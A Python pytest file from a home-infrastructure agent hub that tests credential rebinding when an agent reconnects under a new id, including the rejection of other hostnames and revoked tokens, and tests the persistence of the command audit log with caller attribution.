class TestCredentialRebindOnIdChange:
    """A host that comes back with a DIFFERENT agent_id but the same per-agent
    token must reconnect (and have its credential rebound) instead of failing
    auth until the peer is banned.

    This is the fleet-wide 2.6.0 regression: an agent with no HP_AGENT_ID
    generated a new id on every start, so its persisted per-agent token no longer
    matched any credential for the id it claimed -> permanent lockout.
    """

    @pytest.fixture
    async def repo_srv(self, tmp_path):
        from homepilot.db.connection import Database
        from homepilot.db.migrations import run_migrations
        from homepilot.db.repository import Repository

        db = Database(str(tmp_path / "rebind.db"))
        await db.connect()
        await run_migrations(db)
        repo = Repository(db)
        reg = AgentRegistry(repo=repo)
        srv = AgentHubServer(auth_token=AUTH, registry=reg)
        yield srv, repo
        await db.close()

    async def test_same_host_new_id_authenticates_and_rebinds(self, repo_srv):
        """(a) Same hostname, new agent_id, same token -> authenticates as
        per-agent AND the stored credential is rebound to the new id (the hash is
        unchanged, so the agent keeps using the token it already has).

        Revert-check: remove the _rebind_by_hostname call in _verify_auth and this
        fails (auth returns None — the exact production lockout)."""
        srv, repo = repo_srv
        minted = await srv._mint_agent_credential("old-id", "host1")
        before = await repo.get_agent_credential("old-id")

        res = await srv._verify_auth(
            {"auth_token": minted, "agent_id": "new-id", "hostname": "host1"}
        )
        assert res is not None, "a host presenting its own credential must not be locked out"
        assert res.kind == "per-agent"
        assert res.agent_id == "new-id"

        after = await repo.get_agent_credential("new-id")
        assert after is not None
        assert after["credential_hash"] == before["credential_hash"]
        assert after["hostname"] == "host1"
        assert after["revoked_at"] is None
        # The retired identity keeps no usable credential.
        old_row = await repo.get_agent_credential("old-id")
        assert old_row is None or old_row.get("credential_hash") is None

        # And the next connect under the new id is a plain per-agent match.
        again = await srv._verify_auth(
            {"auth_token": minted, "agent_id": "new-id", "hostname": "host1"}
        )
        assert again is not None and again.kind == "per-agent"

    async def test_rebind_rejected_for_a_different_hostname(self, repo_srv):
        """(b) The same token presented for a DIFFERENT hostname is still rejected
        — the rebind proves possession of a credential issued to THAT host, it
        does not turn a per-agent token into a fleet-wide one.

        Revert-check: drop the hostname filter in
        get_agent_credentials_by_hostname (match any host) and this fails."""
        srv, repo = repo_srv
        minted = await srv._mint_agent_credential("old-id", "host1")

        assert (
            await srv._verify_auth(
                {"auth_token": minted, "agent_id": "new-id", "hostname": "other-host"}
            )
            is None
        )
        # Nothing was rebound: the credential still belongs to the original id.
        assert (await repo.get_agent_credential("old-id"))["credential_hash"] == hash_token(minted)
        assert await repo.get_agent_credential("new-id") is None

    async def test_revoked_credential_never_rebinds(self, repo_srv):
        """(c) A revoked credential must not be laundered back in by claiming a
        new agent_id on the same host.

        Revert-check: drop `revoked_at IS NULL` from
        get_agent_credentials_by_hostname and this fails."""
        srv, repo = repo_srv
        minted = await srv._mint_agent_credential("old-id", "host1")
        assert await repo.revoke_agent_credential("old-id") is True

        assert (
            await srv._verify_auth(
                {"auth_token": minted, "agent_id": "new-id", "hostname": "host1"}
            )
            is None
        )
        assert await repo.get_agent_credential("new-id") is None
        assert (await repo.get_agent_credential("old-id"))["revoked_at"] is not None

    async def test_matching_id_path_unchanged_and_not_reminted(self, repo_srv, tmp_path):
        """(d) The ordinary per-agent path (token matches the claimed id) still
        authenticates without touching the stored credential — no rebind, no
        re-mint, hash and set-time unchanged."""
        srv, repo = repo_srv
        minted = await srv._mint_agent_credential("a1", "host1")
        before = await repo.get_agent_credential("a1")

        res = await srv._verify_auth({"auth_token": minted, "agent_id": "a1", "hostname": "host1"})
        assert res is not None and res.kind == "per-agent" and res.agent_id == "a1"

        after = await repo.get_agent_credential("a1")
        assert after["credential_hash"] == before["credential_hash"]
        assert after["credential_set_at"] == before["credential_set_at"]
        assert len(await repo.get_agent_credentials_by_hostname("host1")) == 1

    async def test_rebind_e2e_over_the_socket(self, tmp_path):
        """The whole journey on the shipped path: enroll, then reconnect over a
        real socket with a NEW agent_id and the persisted token — the hub must
        accept the register and the agent must end up connected under its new id.

        Revert-check: remove the rebind lookup and the reconnect gets
        'invalid auth_token' instead of a register_ack."""
        async with _repo_hub(tmp_path) as (hub, repo):
            _r1, w1, ack1 = await _register_get_ack(hub, "boot-id", "host9", AUTH)
            minted = ack1["auth_token"]
            w1.close()
            await w1.wait_closed()
            await asyncio.sleep(0.05)

            # Restart with a freshly generated id (the 2.6.0 regression) but the
            # persisted per-agent token.
            _r2, _w2, ack2 = await _register_get_ack(hub, "restart-id", "host9", minted)
            assert "error" not in ack2, f"reconnect was rejected: {ack2}"
            assert ack2["action"] == "register_ack"
            assert ack2["agent_id"] == "restart-id"
            # Re-enrolled per-agent: no fresh mint, the credential simply moved.
            assert "auth_token" not in ack2
            row = await repo.get_agent_credential("restart-id")
            assert row is not None and row["credential_hash"] == hash_token(minted)


# --------------------------------------------------------------------------
# Durable + attributable agent-hub audit (#381).
# --------------------------------------------------------------------------

from homepilot.agent_hub.audit import _audit_caller_var  # noqa: E402


class TestAuditPersistence:
    """AuditLog mirrors the fleet-root command trail to the DB best-effort, so it
    survives a restart and carries caller attribution — the in-memory deque was
    volatile and anonymous (#381)."""

    @pytest.fixture
    async def db_repo(self, tmp_path):
        from homepilot.db.connection import Database
        from homepilot.db.migrations import run_migrations
        from homepilot.db.repository import Repository

        db = Database(str(tmp_path / "audit.db"))
        await db.connect()
        await run_migrations(db)
        yield Repository(db), tmp_path
        await db.close()

    async def test_command_audit_survives_restart(self, db_repo):
        """A logged command is retrievable from the DB after a simulated restart:
        a fresh AuditLog with an empty deque, reading the same DB, still sees it.

        Revert-check: drop the ``self._persist(entry)`` call in AuditLog.log (or
        the ``repo=repo`` wiring in AgentRegistry) and the row never lands, so the
        reloaded log is empty -> this fails."""
        repo, tmp_path = db_repo
        audit = AuditLog(repo=repo)
        audit.log(
            agent_id="a1",
            action="exec",
            command_or_path="hostname",
            result="success",
            exit_code=0,
            hostname="web01",
        )
        await asyncio.sleep(0.05)  # let the fire-and-forget persist task commit

        from homepilot.db.connection import Database
        from homepilot.db.repository import Repository

        other = Database(str(tmp_path / "audit.db"))
        await other.connect()
        try:
            fresh = AuditLog(repo=Repository(other))
            assert list(fresh._entries) == []  # nothing in memory after "restart"
            rows = await fresh.query_persisted(limit=10)
        finally:
            await other.close()

        assert len(rows) == 1
        assert rows[0]["agent_id"] == "a1"
        assert rows[0]["command_or_path"] == "hostname"
        assert rows[0]["hostname"] == "web01"
        assert rows[0]["action"] == "exec"

    async def test_caller_from_contextvar_persisted(self, db_repo):
        """The caller field is populated from the request-scoped contextvar and
        persisted to the DB.

        Revert-check: stop reading ``_audit_caller_var`` in log() and the caller
        falls back to 'unknown' -> both asserts fail."""
        repo, _ = db_repo
        audit = AuditLog(repo=repo)
        tok = _audit_caller_var.set("alice (token:abcd1234)")
        try:
            entry = audit.log(
                agent_id="a1",
                action="exec",
                command_or_path="uptime",
                result="success",
            )
        finally:
            _audit_caller_var.reset(tok)
        assert entry.caller == "alice (token:abcd1234)"

        await asyncio.sleep(0.05)
        rows = await repo.query_agent_audit(limit=10)
        assert rows[0]["caller"] == "alice (token:abcd1234)"

    async def test_caller_defaults_unknown_when_unset(self, db_repo):
        repo, _ = db_repo
        audit = AuditLog(repo=repo)
        entry = audit.log(agent_id="a1", action="exec", command_or_path="uptime", result="success")
        assert entry.caller == "unknown"

    async def test_explicit_caller_wins(self, db_repo):
        repo, _ = db_repo
        audit = AuditLog(repo=repo)
        tok = _audit_caller_var.set("alice")
        try:
            entry = audit.log(
                agent_id="a1",
                action="register",
                command_or_path="",
                result="success",
                caller="system",
            )
        finally:
            _audit_caller_var.reset(tok)
        assert entry.caller == "system"

    async def test_no_repo_is_in_memory_only(self):
        """With no repo, log/query behave exactly as before (deque only), and
        query_persisted falls back to the deque newest-first."""
        audit = AuditLog()
        audit.log(agent_id="a1", action="exec", command_or_path="ls", result="success")
        audit.log(agent_id="a2", action="exec", command_or_path="df", result="success")
        assert audit.query()[0]["agent_id"] == "a1"
        rows = await audit.query_persisted()
        assert rows[0]["agent_id"] == "a2"  # newest-first


class TestLifecycleAudit:
    """Register + disconnect emit durable audit rows through the shipped server
    handshake path, so the trail covers the connection lifecycle (#381)."""

    async def test_register_and_disconnect_audited(self, tmp_path):
        """Revert-check: delete the register audit.log call after ``registered =
        True`` (or the disconnect audit.log in the finally block) in
        _handle_agent and the corresponding 'register'/'disconnect' row is
        missing -> fails."""
        async with _repo_hub(tmp_path) as (hub, repo):
            _r, w, ack = await _register_get_ack(hub, "a1", "host1", AUTH)
            assert ack["action"] == "register_ack"
            await asyncio.sleep(0.05)

            rows = await repo.query_agent_audit(limit=50)
            reg_rows = [r for r in rows if r["action"] == "register"]
            assert reg_rows, "no 'register' audit row emitted on connect"
            assert reg_rows[0]["hostname"] == "host1"
            assert reg_rows[0]["caller"] == "system"

            w.close()
            await w.wait_closed()
            await asyncio.sleep(0.1)

            rows2 = await repo.query_agent_audit(limit=50)
            disc_rows = [r for r in rows2 if r["action"] == "disconnect"]
            assert disc_rows, "no 'disconnect' audit row emitted on teardown"
            assert disc_rows[0]["caller"] == "system"
